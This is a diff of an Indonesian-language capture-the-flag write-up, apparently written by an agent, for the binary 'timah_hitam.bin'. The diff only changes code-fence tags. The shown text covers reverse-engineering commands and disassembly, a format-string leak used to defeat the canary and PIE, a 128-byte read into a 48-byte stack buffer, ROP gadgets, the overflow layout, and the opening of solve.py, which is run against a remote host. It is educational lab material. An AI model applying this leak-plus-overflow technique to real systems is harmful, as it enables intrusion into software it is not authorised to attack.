@@ -41,7 +41,7 @@ TechtonicExpoCTF{penuh_racun_66394FFC}
 
 Karena tidak ada `system`/`/bin/sh`, "kunci tersembunyi" itu hampir pasti fungsi win yang mencetak flag — dan string `BENAR! Kunci: ` memang ada di `.rodata`.
 
-```bash
+```
 file timah_hitam.bin ; checksec --file=timah_hitam.bin
 ```
 
@@ -53,7 +53,7 @@ file timah_hitam.bin ; checksec --file=timah_hitam.bin
 
 ### 3.1 Petakan menu ke fungsi
 
-```bash
+```
 r2 -q -A -c 'pdf @ main' timah_hitam.bin
 ```
 
@@ -61,13 +61,13 @@ Hasil: `1→0x1275`, `2→0x143d`, `3→0x153b`, `4→0x1679`, **`5→0x17b7`**,
 
 ### 3.2 Menu 5 "Lapor" — format string
 
-```bash
+```
 r2 -q -A -c 'pdf @ fcn.000017b7' timah_hitam.bin
 ```
 
 Intinya:
 
-```asm
+```
 lea rax, [format]      ; buffer di rbp-0x50
 mov edx, 0x40          ; read 0x40 byte
 call read
@@ -80,7 +80,7 @@ Buffer 64 byte di ruang 0x50, jadi tidak overflow — murni **kebocoran**, persi
 
 ### 3.3 Menu 6 "Buka kunci" — stack overflow
 
-```asm
+```
 sub rsp, 0x30
 lea rax, [buf]         ; buffer di rbp-0x30 (48 byte)
 mov edx, 0x80          ; read 128 byte  <-- 80 byte kelebihan
@@ -95,13 +95,13 @@ Membaca **128 byte ke ruang 48 byte**. Itu "menyimpan input tanpa batas". Menari
 
 `r2 afl` tidak mendaftarkan fungsi apa pun yang memuat `BENAR! Kunci: `. Saya periksa kode mentah setelah akhir fungsi menu 6 (`0x1a1c`):
 
-```bash
+```
 objdump -d -M intel --start-address=0x1a1d --stop-address=0x1a90 timah_hitam.bin
 ```
 
 Ada fungsi utuh di `0x1a1d` yang tidak pernah dipanggil siapa pun — dan ia **menghitung kuncinya sendiri**:
 
-```asm
+```
 movabs rax, 0x183e409ab0f60e4e
 mov    QWORD PTR [rbp-0x2b], rax         ; enc[0..7]
 mov    DWORD PTR [rbp-0x24], 0x6ea6c518  ; enc[7..10]  <-- MENIMPA indeks 7
@@ -118,7 +118,7 @@ Bonus: ada gadget ROP yang sengaja ditaruh di `0x1aeb` (`pop rdi; ret`), `0x1aed
 
 ### 3.5 Pecahkan kuncinya secara statis
 
-```bash
+```
 python3 -c "
 import struct
 b = bytearray(struct.pack('<Q', 0x183e409ab0f60e4e))
@@ -144,7 +144,7 @@ Return address-nya menunjuk `main+0x1989`, jadi `PIE base = leak - 0x1989`.
 
 **Layout overflow.** Buffer di `rbp-0x30`, canary di `rbp-0x8` → 40 byte padding, lalu canary (8), saved rbp (8), lalu return address di offset 56. Total 64 byte, muat di 128.
 
-```bash
+```
 python3 solve.py                        # lokal
 python3 solve.py 168.110.219.59:5026    # remote
 ```
@@ -169,7 +169,7 @@ Catatan tooling: SOP workspace meminta MCP `ghidra_*` untuk task RE, tapi server
 
 `solve.py`:
 
-```python
+```
 #!/usr/bin/env python3
 """Timah Hitam - format-string leak (menu 5) + stack overflow (menu 6) -> fungsi tersembunyi."""
 import re, sys
